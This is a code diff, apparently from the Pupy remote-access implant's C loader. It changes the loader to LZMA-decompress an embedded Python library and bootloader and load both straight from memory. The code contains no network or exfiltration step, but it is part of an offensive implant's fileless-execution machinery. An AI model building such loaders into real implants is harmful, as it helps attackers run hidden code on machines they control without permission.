@@ -17,16 +17,8 @@
 #include "_memimporter.h"
 #include "debug.h"
 
-extern const char resources_python27_so_start[];
-extern const int resources_python27_so_size;
-
-extern const char resources_bootloader_pyc_start[];
-extern const int resources_bootloader_pyc_size;
-
-#ifdef _PYZLIB_DYNLOAD
-extern const char resources_zlib_so_start[];
-extern const int resources_zlib_so_size;
-#endif
+#include "resources_bootloader_pyc.c"
+#include "resources_python27_so.c"
 
 extern DL_EXPORT(void) init_memimporter(void);
 extern DL_EXPORT(void) initpupy(void);
@@ -37,6 +29,8 @@ extern DL_EXPORT(void) initpupy(void);
 #else
 	const uint32_t dwPupyArch = 32;
 #endif
+
+#include "lzmaunpack.c"
 
 uint32_t mainThread(int argc, char *argv[], bool so) {
 
@@ -49,12 +43,29 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	PyGILState_STATE restore_state;
 
 	if(!Py_IsInitialized) {
-		int res=0;
+		void *uncompressed = NULL;
+		size_t uncompressed_size = 0;
 
-		if(!_load_python(
-				"libpython2.7.so",
-				resources_python27_so_start,
-				resources_python27_so_size)) {
+		uncompressed = lzmaunpack(
+			resources_python27_so_start,
+			resources_python27_so_size,
+			&uncompressed_size
+		);
+
+		if (!uncompressed) {
+			dprint("Python decompression failed\n");
+			return -1;
+		}
+
+		int res = _load_python(
+			"libpython2.7.so",
+			uncompressed,
+			uncompressed_size
+		);
+
+		free(uncompressed);
+
+		if (!res) {
 			dprint("loading libpython2.7.so from memory failed\n");
 			return -1;
 		}
@@ -104,18 +115,11 @@ uint32_t mainThread(int argc, char *argv[], bool so) {
 	initpupy();
 	dprint("initpupy()\n");
 
-#ifdef _PYZLIB_DYNLOAD
-	dprint("load zlib\n");
-    if (!import_module("initzlib", "zlib", resources_zlib_so_start, resources_zlib_so_size)) {
-        dprint("ZLib load failed.\n");
-    }
-#endif
-
 	/* We execute then in the context of '__main__' */
 	dprint("starting evaluating python code ...\n");
 	m = PyImport_AddModule("__main__");
 	if (m) d = PyModule_GetDict(m);
-	if (d) seq = PyMarshal_ReadObjectFromString(
+	if (d) seq = PyObject_lzmaunpack(
 		resources_bootloader_pyc_start,
 		resources_bootloader_pyc_size
 	);
